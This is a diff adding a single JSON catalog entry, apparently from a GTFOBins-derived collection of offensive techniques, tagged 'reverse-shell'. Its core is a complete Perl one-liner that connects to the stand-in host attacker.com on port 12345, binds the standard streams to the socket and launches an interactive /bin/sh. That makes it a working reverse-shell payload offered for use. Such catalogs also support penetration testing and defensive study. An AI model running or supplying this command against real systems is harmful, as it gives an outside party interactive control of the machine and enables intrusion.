@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-perl-reverse-shell",
+  "name": "GTFOBins · perl (reverse-shell)",
+  "command": "perl -e 'use Socket;$i=\"attacker.com\";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+  "description": "Use perl to reverse shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "perl",
+    "reverse-shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/perl/#reverse-shell",
+  "upstream_id": "perl/reverse-shell/0",
+  "category": "gtfobins",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/perl/"
+    }
+  ]
+}
